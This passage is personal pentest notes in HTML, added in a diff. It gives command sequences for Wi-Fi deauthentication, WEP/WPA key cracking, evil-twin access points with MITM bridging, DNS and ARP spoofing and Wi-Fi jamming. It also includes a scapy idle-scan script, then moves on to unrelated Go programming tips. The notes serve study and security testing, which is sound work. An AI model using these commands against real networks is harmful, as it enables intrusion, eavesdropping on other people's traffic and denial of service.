+	U--&gt;&gt;AP:Authentication: MAC Address
+	AP--&gt;&gt;U:Association
+	Note left of U: Access granted!
+	AP--&gt;&gt;U:Deauthentication
+	Note left of U: Automatic reconnection attempt (possible exposure of the password)
+	Note right of AP: The source of the frame is not verified (possibility of spoofing the AP)
+</pre>
+<pre><code class="language-bash">aireplay-ng &lt;interface-name&gt; --deauth=3 -a xx:xx:xx:xx:xx:xx # default, destination == broadcast (ff:ff:ff:ff:ff:ff)
+# a = bssid
+# deauth = frames
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="dns"><a class="header" href="#dns">DNS</a></h1>
+<p><img src="it/attacks/network/dns/./img/how_dns_work.png" alt="How DNS work" /></p>
+<ol>
+<li>The computer sends (through the stub resolver) the request to the recursive DNS server of its configuration</li>
+<li>The recursive DNS server sends successively its request to 3 DNS levels</li>
+<li>Solicitation of a root DNS. There are 13 of them with a unique IP. It sends back to the recursive DNS, the addresses of the servers managing the resolution of the 1st level domain (Ex: .io)</li>
+<li>Solicitation of a TLD server managing the top level domain</li>
+<li>Response containing the addresses of the servers managing the TLD (Ex: github.io)</li>
+<li>Solicitation of the server managing github.io</li>
+<li>The server provides the IP to reach bilou4.github.io</li>
+<li>The recursive DNS server provides this IP to the computer</li>
+</ol>
+<p><u>stub resolver</u>: library or DNS component of the computer. It receives DNS requests from the computer's applications and communicates them to the recursive server present in the network interface settings. Sometimes a cache can be present to increase performance (Ex: systemd, systemd-resolv)</p>
+<p><u>Recursive DNS server</u>: It does not have DNS information as such. It gets DNS resolution by querying other DNS types. It has a cache.</p>
+<p><u>Root DNS</u>: There are 13 of them and their IP address is stored in the recursive DNS. They respond to recursive DNS by providing the address of TLD servers.</p>
+<p><u>Top Level Domain</u>: These servers have the names and addresses of all authoritative DNS servers for a domain name under the top level domain they manage.</p>
+<p><u>DNS authority on a DNS domain</u>: this is the DNS server that holds all DNS entries attached to the domain name being resolved</p>
+<p>The following command allows you to see these exchanges:</p>
+<pre><code class="language-bash">$ dig bilou4.github.io +trace
+</code></pre>
+<h2 id="network-risks"><a class="header" href="#network-risks">Network risks</a></h2>
+<ol>
+<li><u>Privacy loss</u>: DNS queries are in clear. It can be intercepted and modified (content injection) or blocked (censorship)</li>
+<li><u>compromise responses</u>: DNS queries are poorly signed (DNSsec allows the client to verify that the response comes from an authority. This protects against injection but not inspection or censorship).</li>
+<li><u>unavailability</u>: an attacker can block a computer's connection to a recursive DNS. The goal of the attack would be to respond faster than the legitimate response with a fake DNS resolution.</li>
+</ol>
+<h3 id="protection"><a class="header" href="#protection">Protection</a></h3>
+<p>Currently, there is no solution to encrypt between recursive DNS and DNS authorities but 2 protocols exist:</p>
+<ul>
+<li>Dns Over Tls</li>
+<li>Dns Over Https</li>
+</ul>
+<p><u>Stubby</u>: is a tool to encrypt queries between the client and the recursive DNS. It contains a list of DOT servers in its default configuration. ⚠️ may have performance impacts.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="dns-spoofing"><a class="header" href="#dns-spoofing">DNS Spoofing</a></h1>
+<p>Can sometimes refer to DNS cache poisoning.
+This refers to an attack where a host with no authority, directs a DNS and all its queries.</p>
+<p>So an attacker can redirect all DNS queries to his own machine in order to steal data from the victim.</p>
+<p>This is a LAN or WLAN attack, which is required for the attacker and victim to have the same network gateway.</p>
+<p>It is possible to detect if someone is using this technique on our network (https://null-byte.wonderhowto.com/how-to/tutorial-dns-spoofing-0167796)</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="man-in-the-middle"><a class="header" href="#man-in-the-middle">Man in the Middle</a></h1>
+<p><strong>Concept:</strong>
+The hacker is connected to the same switch as the victims and performs a kind of relay between them.</p>
+<h2 id="arp-protocol"><a class="header" href="#arp-protocol">ARP protocol</a></h2>
+<p>Computer-1 wants to communicate with Computer-2 and sends an ARP request to get its MAC address. Computer-2 returns its MAC address.</p>
+<p><img src="it/attacks/network/mitm/./img/arp-protocol.svg" alt="How does ARP protocol work" /></p>
+<h2 id="tools-1"><a class="header" href="#tools-1">Tools</a></h2>
+<h3 id="3viltwinatatcker"><a class="header" href="#3viltwinatatcker">3vilTwinAtatcker</a></h3>
+<p>Create a fake access point to facilitate an MITM attack.</p>
+<h2 id="mitm-proxy"><a class="header" href="#mitm-proxy">MITM Proxy</a></h2>
+<p><a href="https://mitmproxy.org/">mitmproxy</a> allows to:</p>
+<ul>
+<li>examine multiple client-side requests</li>
+<li>examine HTTPS traffic, replay requests...</li>
+<li>alter web server requests or responses</li>
+</ul>
+<pre><code class="language-bash">mitmproxy # 'i' to 'insert'
+? # help
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="network-sniffing"><a class="header" href="#network-sniffing">Network Sniffing</a></h1>
+<p><strong>Concept:</strong> Interception of traffic (packets), then packets analysis, decoding of packets if necessary. Information retrieval, browsed URL, username, passwords...</p>
+<h2 id="tools-2"><a class="header" href="#tools-2">Tools</a></h2>
+<h3 id="ettercap"><a class="header" href="#ettercap">Ettercap</a></h3>
+<p>Tools for Man in the Middle attacks on a LAN. Ettercap is able to perform attacks on the ARP protocol to position itself as a 'Man in the Middle'. This subsequently allows:</p>
+<ul>
+<li>infect, replace and delete data in a connection</li>
+<li>discover passwords for protocols such as FTP, HTTP, POP... Every protocol that is not secure.</li>
+<li>Provide victims with fake SSL certificates in HTTPS sessions</li>
+</ul>
+<h3 id="bettercap"><a class="header" href="#bettercap">Bettercap</a></h3>
+<p>The Swiss Army knife for WiFi, Bluetooth Low Energy, wireless HID hijacking and IPv4 and IPv6 networks reconnaissance and MITM attacks.
+<a href="https://www.bettercap.org/">ベッターキャップ！</a></p>
+<h3 id="wireshark"><a class="header" href="#wireshark">Wireshark</a></h3>
+<p>Free packet analyzer. It is used for troubleshooting and analysis of computer networks, protocol development, education and reverse engineering.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="network-spoofing"><a class="header" href="#network-spoofing">Network Spoofing</a></h1>
+<p><strong>Concept:</strong>
+Sending IP packets using a source IP address that has not been assigned to the sending computer. This is used to:</p>
+<ul>
+<li>Hide one's own identity during a server attack.</li>
+<li>Impersonate other network equipment to gain access to services.</li>
+<li>Modify packets to gain information between two communicating parties.</li>
+</ul>
+<p>The hacker sends a spoofed packet to try to take the identity of the spoofed machine. The target machine will think it is the genuine machine trying to communicate with it. Without meaning to, the target sends the packets back to the hacker.</p>
+<p><strong>Example</strong>: if a hacker manages to spoof a DNS server, he can recover its IP address and thus redirect the target to any site (phishing...)</p>
+<h2 id="tools-3"><a class="header" href="#tools-3">Tools</a></h2>
+<h3 id="dnschef"><a class="header" href="#dnschef">DNSChef</a></h3>
+<p>To create fake domains (domain request) and control the victim's traffic</p>
+<pre><code class="language-sh">dnschef --fakeip=192.168.1.129 --fakedomains example.com --interface 192.168.1.149 -q
+</code></pre>
+<ul>
+<li>fakedomains: domain the user wants to reach</li>
+<li>fakeip: IP to which the user will be redirected</li>
+<li>interface: refers to the interface used</li>
+</ul>
+<h3 id="arpspoof"><a class="header" href="#arpspoof">ARPSpoof</a></h3>
+<ul>
+<li>sniff traffic</li>
+<li>Forge ARP packets between 2 communicating parties</li>
+<li>ARP cache and MAC address</li>
+</ul>
+<pre><code class="language-sh">arpspoof -t [@targetmachine] [@poofedmachine]
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="wifi---attack-on-wireless-networks"><a class="header" href="#wifi---attack-on-wireless-networks">Wifi - Attack on Wireless Networks</a></h1>
+<h2 id="introduction-1"><a class="header" href="#introduction-1">Introduction</a></h2>
+<p><strong>Handshake</strong></p>
+<p>When we try to connect to a network, our computer goes to the access point (box) which will respond with a challenge. Our computer responds to the box with this encrypted challenge and the security key. The box receives confirmation that the device knows the key thanks to the encryption of the first challenge and therefore informs the device that for it communication is possible and encrypts the computer's challenge. The computer receives this message. It checks the encryption in turn. If both devices agree, then the communication is successfully established.</p>
+<p><img src="it/attacks/network/wifi/./img/handshake.png" alt="handshake" /></p>
+<h2 id="tools-4"><a class="header" href="#tools-4">Tools</a></h2>
+<h3 id="aircrack-ng"><a class="header" href="#aircrack-ng">Aircrack-ng</a></h3>
+<p>This is a suite of wireless network monitoring software whose main use is to break WEP and WPA keys in WIFI networks.
+It is a rework of the discontinued aircrack software.</p>
+<p><strong>Some features</strong>:</p>
+<pre><code class="language-sh">aircrack-ng # static WEP and WPA-PSK key breaker
+airdecap-ng # decrypt captured WEP/WPA files
+aidriver-ng # allows you to patch drivers, which is useful for packet injection
+airplay-ng # packet injection program
+airmon-ng # enables/disables the monitor mode of a wifi card. In this mode the wifi card is placed as an observer of the network
+airodump-ng # packet capture program 802.11
+</code></pre>
+<h3 id="kismet"><a class="header" href="#kismet">Kismet</a></h3>
+<p>This is a free network detection software, sniffer and intrusion detection system for 802.11 wireless networks.</p>
+<p>It works with cards that support monitor mode and any 802.11 protocol.</p>
+<h2 id="configuration"><a class="header" href="#configuration">Configuration</a></h2>
+<pre><code class="language-sh">iwconfig # see its wifi configs
+iwconfig [mapName] txpower 30 # increase its txpower by 30
+airmon-ng start [mapName] # wifi card in monitor mode =&gt; indicate that you want to intercept all packets on the network
+</code></pre>
+<h2 id="preparation-of-the-equipment"><a class="header" href="#preparation-of-the-equipment">Preparation of the equipment</a></h2>
+<p>Wifi card connected to the network</p>
+<pre><code class="language-sh">airmon-ng check kill # kill airmon related processes
+airmon-ng start [interfaceName] # start monitor mode
+
+airodump-ng [nomInterfaceMonitor] # scan for available wireless networks
+</code></pre>
+<pre><code class="language-sh"># Ability to restart the service (instead of restarting the computer)
+systemctl start wpa_supplicant.service &amp;&amp; NetworkManager
+</code></pre>
+<h2 id="bypassing-hssi-hidden-service-set-identifier"><a class="header" href="#bypassing-hssi-hidden-service-set-identifier">Bypassing HSSI (Hidden Service Set Identifier)</a></h2>
+<p>HSSI, consists in hiding the ESSID.</p>
+<p>To obtain the ESSID, 2 possible methods:</p>
+<ul>
+<li>sniff the WI-FI environment and wait for a client associated with a network to connect and capture this association</li>
+<li>De-authenticate a client and force it to re-associate with the Access Point and capture the association</li>
+</ul>
+<pre><code class="language-sh">aireplay-ng -0 5 -a [HiddenMacNetworkAddress] [InterfaceMonitoringName]
+# -0 to indicate that we will de-authenticate
+# 5 to indicate that we are sending 5 packets
+</code></pre>
+<p>NB: remember to do the capture at the same time with airdump.</p>
+<h2 id="attacking-wep-wireless-equivalent-privacy"><a class="header" href="#attacking-wep-wireless-equivalent-privacy">Attacking WEP (Wireless Equivalent Privacy)</a></h2>
+<p>Quickly replaced by WPA (Wifi Protected Access)</p>
+<h3 id="initialization-vector-iv"><a class="header" href="#initialization-vector-iv">Initialization Vector (IV)</a></h3>
+<p>The RC4 base - stream Cipher Introduce a random element in the encrypted data.
+VI-24 bit is too small to prevent repetition. Key can be recovered in 3 min (usually).</p>
+<h3 id="manual-attack"><a class="header" href="#manual-attack">Manual attack</a></h3>
+<p>Wifi card connected in monitoring mode!</p>
+<pre><code class="language-sh">airodump-ng [interfaceMonitor] # search for vulnerable wifi networks (BSSID recovery)
+airodump-ng -c 11 -w [captureFilename] -b [BSSID] [interfaceMonitor] # check for passing Beacons
+aireplay-ng -1 0 -a [BSSID] [interfaceMonitor] # send false authentication
+aireplay-ng -3 -b [BSSID] [interfaceMonitor] # sending packets to send Beacons
+aircrack-ng [captureFilename] # will attempt to crack the network (need as many IVs as possible)
+</code></pre>
+<h3 id="automated-attack"><a class="header" href="#automated-attack">Automated attack</a></h3>
+<pre><code class="language-sh">wifite # Power (the bigger is the number, the closer is the network) | To attack: CTRL+C (stop the analysis and start the interaction)
+</code></pre>
+<p>The password is also displayed in a crack.csv file</p>
+<pre><code class="language-sh">wifi cracker # GUI =&gt; everything is automated, just need to configure the bases. Different types of attacks are possible.
+</code></pre>
+<h2 id="attacking-wpa-and-wpa2-wifi-protected-access"><a class="header" href="#attacking-wpa-and-wpa2-wifi-protected-access">Attacking WPA and WPA2 Wifi Protected Access</a></h2>
+<ul>
+<li>WPA and WPA2 are Wi-Fi security protocols, succeeding WEP and solving the problems present on it</li>
+<li>They use a PSK (pre-shared key) to secure the communication. PSK must be random (13 char minimum)</li>
+<li>Most common attack =&gt; bruteforce</li>
+<li>If configured in enterprise mode using a RADIUS authentication server, WPA is almost impossible to crack</li>
+</ul>
+<p>With the wifi card connected in monitoring mode!</p>
+<pre><code class="language-sh">airodump-ng [interfaceMonitor] # see the available networks you want to attack
+airodump-ng -bssid [BSSID] --channel 1 --write [capturefile] [interfaceMonitor] # start listening for handshakes in an output file (capture)
+aireplay-ng --deauth 1 -a [BSSID] [interfaceMonitor] --ignore-negative-one # start de-authentication packets
+
+aircrack-ng [capturefile] -w /usr/share/wordlists/fern-wifi/common.txt
+</code></pre>
+<p>The <code>revear</code> attack is more concerned with testing PINs and may take longer.</p>
+<pre><code class="language-sh">airodump-ng [interfaceMonitor]
+reaver -i [interfaceMonitor] -b [BSSID] -c [n°Channel] -vv
+</code></pre>
+<h2 id="cloning-access-points"><a class="header" href="#cloning-access-points">Cloning access points</a></h2>
+<p>Manipulate the user's packets and retrieve the handshakes and keys by pretending to be the network the user is used to.</p>
+<p>Wifi card connected and in monitoring mode.</p>
+<pre><code class="language-sh">airbase-ng -c [channelNumber] -e &quot;AccessName&quot; [interfaceMonitor] # create a fake access point
+
+airbase-ng -c [channelNumber (less than default channel)] -a [BSSID] -e &quot;ESSIDname&quot; -L -W1 [interfaceMonitor] # copy an access point
+# then wait for someone to connect
+airodump-ng [interfaceMonitor] --bssid [BSSID] -w [capturefile] # create a capture file
+airecrack-ng [capturefile] # crack the key (need as many IVs as possible)
+
+
+# set up a MITM
+
+airbase-ng --essid [netname=mitm] -c [channelNumber] [interfaceMonitor] # create an access point. This also creates an intermediate interface 'at0' for bridging.
+brctl addbr mitm-bridge # bridgeControl tool to create bridges
+brctl addif mitm-bridge eth0
+brctl addif mitm-bridge at0
+ifconfig eth0 0.0.0.0 up
+ifconfig at0 0.0.0.0 up
+echo 1 &gt; /proc/sys/net/ipv4/ip_forward # enable port forwarding
+
+# Wait for someone to connect.
+# Run wireshark to sniff traffic.
+# We have access to all the user's requests whether they are on a phone or a computer.
+</code></pre>
+<h2 id="dos-attack"><a class="header" href="#dos-attack">DOS attack</a></h2>
+<p>Dos attack by de-authenticating or directly causing denial of service.
+Wireless networks are extremely susceptible to DOS. In addition, it is difficult to locate the attackers.</p>
+<p>Create a DOS by flooding the network with authentication packets.</p>
+<pre><code class="language-sh">aireplay-ng -0 5 -a [BSSID] [interfaceMonitor] # tool to flood
+# -0 to indicate that these are de-authentication packets
+# 5 to say that we are sending 5. If you put 0, it's a continuous stream of packets
+
+websploit
+show modules # show available modules
+use wifi/wifi_jammer
+show options
+set interface [interfaceMonitor] # check that the options are correctly set (interface, bssid, essid)
+run # run the attack
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="zombie-scanning---idle-host-scanning"><a class="header" href="#zombie-scanning---idle-host-scanning">Zombie Scanning - Idle Host Scanning</a></h1>
+<p><strong>Concept</strong> : Scanning ports on a machine, but the target machine thinks it is another person scanning it =&gt; Anonymity.</p>
+<p>When a machine receives 2 packets very close together, it has to determine the order of the packets -&gt; the IP protocol has a field for numbering packets, it's called IPPID (incremental)</p>
+<pre><code class="language-sh">hping3 192.168.12.33 --icmp # -&gt; you can see the incremental ids
+</code></pre>
+<p><img src="it/attacks/network/zombie-scanning/./img/howZombieScanningWorks.svg" alt="How zombie scanning works" /></p>
+<p><strong>Diagram explanation:</strong>
++ Step 1: The attacker sends a Syn/Ack packet to find out the zombie's IPID (which returns a RST - reset)</p>
+<ul>
+<li>
+<p>Step 2: The attacker sends a SYN message to the target machine, spoofing the zombie's address. If the target machine's port is open, then it will reply to zombie with a SYN/ACK packet. Zombie will then send a RST packet to the target because it is not really the sender. Zombie must have sent a RST packet and must therefore increment its IPID.</p>
+</li>
+<li>
+<p>Step 3: Verify the IPID by sending a new SYN/ACK packet to our zombie, if the IPID received in response has been incremented twice then we are sure that the target machine's port is open.</p>
+</li>
+</ul>
+<h2 id="tools-5"><a class="header" href="#tools-5">Tools</a></h2>
+<h3 id="scapy"><a class="header" href="#scapy">Scapy</a></h3>
+<p>Injection and manipulation of packets in a network</p>
+<p>Module for python to forge, decode, transmit and receive packets from a multitude of protocols (ARP, DHCP, DNS, ICMP, IP...)</p>
+<pre><code class="language-python">i = IP() # create an IP layer variable
+i.display() # component of the variable
+i.dest = '192.168.13.33' # change the @ dest
+i.src # can change by itself because scapy knows the @ of the network card
+
+u = UDP()
+u.dport # display port numbers (123 for ntp)
+u.display() # displays the port names.
+
+request = (i/u) # assign the 2 layers together
+request.display() # to display
+
+response = sr1(request) # receive the transmitted packet
+reponse.display() # to analyze the received packet
+
+# the same thing in one line
+response = sr1(IP(dst='193.168.13.33')/UDP(dport=53), timeout=1, verbose=1)
+response.display()
+</code></pre>
+<p><strong>Python script</strong></p>
+<pre><code class="language-python">import os
+import sys
+from scapy.all import *
+# Bonus imports so VsCode is happy
+from scapy.layers.inet import IP, UDP, TCP, ICMP
+
+def is_root():
+    return os.getuid() == 0
+
+def run_scan(zombie, target, port):
+    print(f&quot;[+] Scan {target} port {port} using {zombie} as zombie&quot;)
+    # get zombie's IP id with SYN/ACK
+    p1 = sr1(IP(dst=zombie)/TCP(sport=12345, dport=123, flags='SA'), verbose=0)
+
+    initial_id = p1.id
+
+    print(f&quot;[+] Zombie initial id {initial_id}&quot;)
+
+    # SYN to target with spoofed IP from zombie
+    p2 = send(IP(dst=target, src=zombie)/TCP(sport=12345, dport=(port), flags='S'), verbose=0)
+
+    # SYN/ACK to zombie to see if it heard back from the target
+    p3 = sr1(IP(dst=zombie)/TCP(sport=12345, dport=(123), flags='SA'), verbose=0)
+    final_id = p3.id
+
+    print(f&quot;[+] Zombie final id {final_id}&quot;)
+
+    if((final_id - initial_id) &lt; 2):
+        print(f&quot;[+] Port {port} : closed&quot;)
+    else:
+        print(f&quot;[+] Port {port} : opened&quot;)
+
+if __name__ == '__main__':
+    if (not is_root()):
+        print(&quot;[!] Must be run as root. Quitting&quot;)
+        sys.exit(1)
+
+    if(len(sys.argv) &lt; 4 or sys.argv[1] == '-h'):
+        print(&quot;Usage: main.py zombieIP targetIP targetPort&quot;)
+        sys.exit(1)
+
+    run_scan(sys.argv[1], sys.argv[2], int(sys.argv[3]))
+</code></pre>
+<h3 id="nmap"><a class="header" href="#nmap">Nmap</a></h3>
+<pre><code class="language-sh">nmap 192.168.133.144 -p 80 # find out if port 80 is open.
+
+nmap -sI [@Zombie] [@cible] -p [port]
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="social-engineering"><a class="header" href="#social-engineering">Social Engineering</a></h1>
+<p>Books:
++ the Art of Deception - Controlling the human element of security, Kevin Mitnick</p>
+<h2 id="tools-6"><a class="header" href="#tools-6">Tools</a></h2>
+<h3 id="set-social-engineering-toolkit"><a class="header" href="#set-social-engineering-toolkit">SET (Social Engineering Toolkit)</a></h3>
+<ul>
+<li>phishing</li>
+<li>web pages copies</li>
+<li>mail bombing</li>
+<li>infection every time a CD/DVD/USB is inserted</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="osint"><a class="header" href="#osint">OSINT</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="google-dorks"><a class="header" href="#google-dorks">Google Dorks</a></h1>
+<h2 id="summary"><a class="header" href="#summary">Summary</a></h2>
+<table><thead><tr><th align="left">Filter</th><th align="left">Description</th></tr></thead><tbody>
+<tr><td align="left"><code>allintext:&quot;keyword&quot;</code></td><td align="left">Searches for occurrences of all the keywords given.</td></tr>
+<tr><td align="left"><code>intext:&quot;keyword&quot;</code></td><td align="left">Searches for the occurrences of keywords all at once or one at a time.</td></tr>
+<tr><td align="left"><code>inurl:&quot;keyword&quot;</code></td><td align="left">Searches for a URL matching one of the keywords.</td></tr>
+<tr><td align="left"><code>allinurl:&quot;keyword&quot;</code></td><td align="left">Searches for a URL matching all the keywords in the query.</td></tr>
+<tr><td align="left"><code>intitle:&quot;keyword&quot;</code></td><td align="left">Searches for occurrences of keywords in title all or one.</td></tr>
+<tr><td align="left"><code>allintitle:&quot;keyword&quot;</code></td><td align="left">Searches for occurrences of keywords all at a time.</td></tr>
+<tr><td align="left"><code>site:&quot;www.google.com&quot;</code></td><td align="left">Specifically searches that particular site and lists all the results for that site.</td></tr>
+<tr><td align="left"><code>filetype:&quot;pdf&quot;</code></td><td align="left">Searches for a particular file type mentioned in the query.</td></tr>
+<tr><td align="left"><code>link:&quot;keyword&quot;</code></td><td align="left">Searches for external links to pages.</td></tr>
+<tr><td align="left"><code>numrange:321-325</code></td><td align="left">Used to locate specific numbers in your searches.</td></tr>
+<tr><td align="left"><code>(before:2000-01-01 after:2001-01-01)</code></td><td align="left">Used to search within a particular date range.</td></tr>
+<tr><td align="left"><code>inanchor:rat</code> (allinanchor)</td><td align="left">This shows sites which have the key terms in links pointing to them, in order of the most links.</td></tr>
+<tr><td align="left"><code>allinpostauthor:&quot;keyword&quot;</code> (inpostauthor)</td><td align="left">Exclusive to blog search, this one picks out blog posts that are written by specific individuals.</td></tr>
+<tr><td align="left"><code>related:www.google.com</code></td><td align="left">List web pages that are “similar” to a specified web page.</td></tr>
+<tr><td align="left"><code>cache:www.google.com</code></td><td align="left">Shows the version of the web page that Google has in its cache.</td></tr>
+</tbody></table>
+<h3 id="features"><a class="header" href="#features">Features</a></h3>
+<h4 id="or---and"><a class="header" href="#or---and">OR - AND</a></h4>
+<pre><code>site:facebook.com | site:twitter.com
+site:facebook.com &amp; site:twitter.com
+</code></pre>
+<h4 id="include-results"><a class="header" href="#include-results">Include results</a></h4>
+<p>This will order results by the number of occurrences of the keyword.</p>
+<pre><code>-site:facebook.com +site:facebook.*
+</code></pre>
+<h4 id="exclude-results"><a class="header" href="#exclude-results">Exclude results</a></h4>
+<pre><code>site:facebook.* -site:facebook.com
+</code></pre>
+<h4 id="synonyms"><a class="header" href="#synonyms">Synonyms</a></h4>
+<p>Adding a <code>~</code> to a word tells Google that you want it to bring back synonyms for the term as well. For example, entering <code>~set</code> will bring back results that include words like <code>configure</code>, <code>collection</code> and <code>change</code> which are all synonyms of <code>set</code>.</p>
+<pre><code>~set
+</code></pre>
+<h4 id="glob-pattern-"><a class="header" href="#glob-pattern-">Glob pattern (*)</a></h4>
+<p>Putting an asterisk in a search tells Google <code>I don’t know what goes here</code>. Basically, it’s really good for finding half remembered song lyrics or names of things.</p>
+<pre><code>site:*.com
+</code></pre>
+<h2 id="tools-7"><a class="header" href="#tools-7">Tools</a></h2>
+<p><a href="https://github.com/Zarcolio/sitedorks">https://github.com/Zarcolio/sitedorks</a> : Search Google/Bing/Ecosia/DuckDuckGo/Yandex/Yahoo for a search term with a default set of websites, bug bounty programs or a custom collection.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="go"><a class="header" href="#go">Go</a></h1>
+<p>Why Go?</p>
+<ul>
+<li>clean package management system</li>
+<li>cross compilation</li>
+<li>rich standard library</li>
+<li>concurrency</li>
+</ul>
+<p>Why not Go?</p>
+<ul>
+<li>binary size</li>
+<li>verbosity</li>
+</ul>
+<h2 id="build-flags"><a class="header" href="#build-flags">Build flags</a></h2>
+<ul>
+<li>buildvcs=false omits version control information</li>
+<li>ldflags=
+<ul>
+<li>&quot;-w -s&quot; strips binaries</li>
+<li>&quot;-X path/to/a/variable&quot; change variable value at compile time</li>
+</ul>
+</li>
+<li>CGO_ENABLED
+<ul>
+<li>=0 ideal for scratch docker image (no host OS to be bundled). It uses a basic Go implementation</li>
+<li>=1 uses the native OS libraries. It implies a smaller binary size but relies on delivering a host OS too. It must be set to 1 if your application imports a package with C code.</li>
+</ul>
+</li>
+</ul>
+<pre><code class="language-go">for idx, value := range &amp;a{} // a is copied
+
+for idx, value := range a{} // a is not copied
+</code></pre>
+<pre><code class="language-go">uintptr // type containing an integer of a memory address and not a reference to a pointer
+</code></pre>
+<p>Go type-safe pointer → keeps its reference to the runtime without Garbage Collector problem</p>
+<p>unsafe.Pointer → can be garbage collected</p>
+<h2 id="variables-are-passed-by-value"><a class="header" href="#variables-are-passed-by-value">Variables are passed by value</a></h2>
+<p>In Go, arrays are passed by value.</p>
+<pre><code class="language-Go">var t1 [5]int32
+var t2 [5]int32{0,0,0,0,0}
+var t3 [...]int32{0,0,0} // number of elements in the array are computed at compile time
+</code></pre>
+<p>Slices are passed by reference.</p>
+<pre><code class="language-Go">s1 := t1[:]
+s2 := []int{0,1,2,3}
+</code></pre>
+<h3 id="except-for-slices-and-maps"><a class="header" href="#except-for-slices-and-maps">Except for slices and maps</a></h3>
+<p>TODO: examples
+For slices: values can be changed but you cannot add elements.
+For maps: any changes are reflected in the variable passed into the function.</p>
+<h3 id="pretty-print---table-print"><a class="header" href="#pretty-print---table-print">Pretty print - table print</a></h3>
+<pre><code class="language-Go">package main
+
+import (
+	&quot;fmt&quot;
+	&quot;os&quot;
+	&quot;strings&quot;
+	&quot;text/tabwriter&quot;
+)
+
+func main() {
+	writer := tabwriter.NewWriter(os.Stdout, 0, 4, 0, '\t', 0)
+	table := [][]string{{&quot;A&quot;, &quot;B&quot;}, {&quot;A&quot;, &quot;B&quot;}, {&quot;A&quot;, &quot;B&quot;}}
+	for _, line := range table {
+		fmt.Fprintln(writer, strings.Join(line, &quot;\t&quot;)+&quot;\t&quot;)
+	}
+	writer.Flush()
+}
+</code></pre>
+<pre><code class="language-bash"># Output
+A	B
+A	B
+A	B
+</code></pre>
+<h3 id="download-indication"><a class="header" href="#download-indication">Download indication</a></h3>
+<pre><code class="language-Go">package main
+
+import (
+	&quot;fmt&quot;
+	&quot;strconv&quot;
+	&quot;strings&quot;
+	&quot;time&quot;
+)
+
+func lenItoa(i int) int {
+	return len(strconv.Itoa(i))
+}
+
+func main() {
+	var s string = &quot;Downloading:  0%&quot;
+
+	fmt.Print(s)
+	for i := 0; i &lt;= 100; i++ {
+
+		time.Sleep(100 * time.Millisecond)
+		fmt.Print(strings.Repeat(&quot;\b&quot;, lenItoa(i)+1))
+		fmt.Printf(&quot;%d%%&quot;, i)
+	}
+	fmt.Println()
+}
+
+</code></pre>
+<h2 id="memoization-in-go"><a class="header" href="#memoization-in-go">Memoization in Go</a></h2>
+<p>Closures in Go can help you perform memoization on a specific function prototype.</p>
+<p>Closures are functions declared inside of functions. The inner function is able to access and modify variables declared in the outer function.</p>
+<pre><code class="language-Go">package main
+import (
+  &quot;fmt&quot;
+  &quot;time&quot;
+)
+func add(a, b int) int {
+  time.Sleep(5 * time.Second)
+  return a+b
+}
+
+func memoization(f func(int,int)int) func(int,int)int{
+  cache := make(map[string]int)
+  return func(a,b int) int{
+    i := fmt.Sprintf(&quot;%d+%d&quot;,a,b)
+    if v,ok := cache[i]; ok {
+      return v
+    }
+    res := f(a,b)
+    cache[i] = res
+    return res
+  }
+}
+
+func main() {
+  println(&quot;add(1,1) without memoization&quot;)
+  start := time.Now()
+  // the execution will last at least 5 seconds
+  println(&quot;res = &quot;, add(1,1), time.Since(start).String())
+
+  addMemoized := memoization(add)
+  println(&quot;add(1,1) with memoization 1/n&quot;)
+  start = time.Now()
+  // the execution will last at least 5 seconds
+  println(&quot;res = &quot;, addMemoized(1,1), time.Since(start).String())
+
+  println(&quot;add(1,1) with memoization 2/n&quot;)
+  start = time.Now()
+  // the execution will be instant
+  println(&quot;res = &quot;, addMemoized(1,1), time.Since(start).String())
+}
+</code></pre>
+<h2 id="gracefully-shutdown-your-server"><a class="header" href="#gracefully-shutdown-your-server">Gracefully shutdown your server</a></h2>
+<pre><code class="language-Go">var err error
+ctx := context.Background()
+done := make(chan os.Signal, 1)
+errChan := make(chan error, 1)
+signal.Notify(done, os.Interrupt, syscall.SIGTERM)
+
+serv := &amp;http.Server{
+  Addr: addr,
+  Handler: routes,
+}
+
+go func() {
+	err = srv.ListenAndServe()
+	if err != nil {
+		errChan &lt;- err
+	}
+}()
+
+select {
+	case &lt;- done:
+	case &lt;- errChan:
+		// do something with the error
+}
+
+err = srv.Shutdown()
+// do something with the error
+log.Println(&quot;server stopped&quot;)
+</code></pre>
+<h2 id="hot-reload"><a class="header" href="#hot-reload">Hot reload</a></h2>
+<p><code>SIGHUP</code> is a signal sent to a process when its controlling terminal is closed. It is common practice for daemonized process to use <code>SIGHUP</code> for configuration reload .This allows us to not terminate the process while making changes.</p>
+<pre><code class="language-bash">kill -SIGHUP PID
+</code></pre>
+<pre><code class="language-go">package main
+
+import (
+	&quot;fmt&quot;
+	&quot;net/http&quot;
+	&quot;os&quot;
+	&quot;os/signal&quot;
+	&quot;syscall&quot;
+)
+
+type config struct {
+	Msg string
+}
+
+var conf = &amp;config{Msg: &quot;Hello World&quot;}
+
+func main() {
+	http.HandleFunc(&quot;/&quot;, func(w http.ResponseWriter, r *http.Request) {
+		w.Write(([]byte(conf.Msg)))
+	})
+
+	sigs := make(chan os.Signal, 1)
+
+	signal.Notify(sigs, syscall.SIGHUP)
+	go http.ListenAndServe(&quot;:8000&quot;, nil)
+	fmt.Println(&quot;Program PID:&quot;, os.Getpid())
+	for {
+		// blocking if no default
+		select {
+		case &lt;-sigs:
+			conf.Msg = &quot;Go Go Go&quot;
+		}
+	}
+}
+</code></pre>
+<pre><code class="language-bash">$ ./server &amp;
+Program PID: 17247
+$ curl localhost:8000
+Hello World
+$ kill -SIGHUP 17247 
+$ curl localhost:8000
+Go Go Go
+</code></pre>
+<h2 id="using-a-map-as-a-set"><a class="header" href="#using-a-map-as-a-set">Using a map as a Set</a></h2>
+<p>There are 2 possibilities.
+The first one is using bool as value: it uses one byte in memory. But it is easier to read/understand.</p>
+<pre><code class="language-Go">intSet := map[int]bool{}
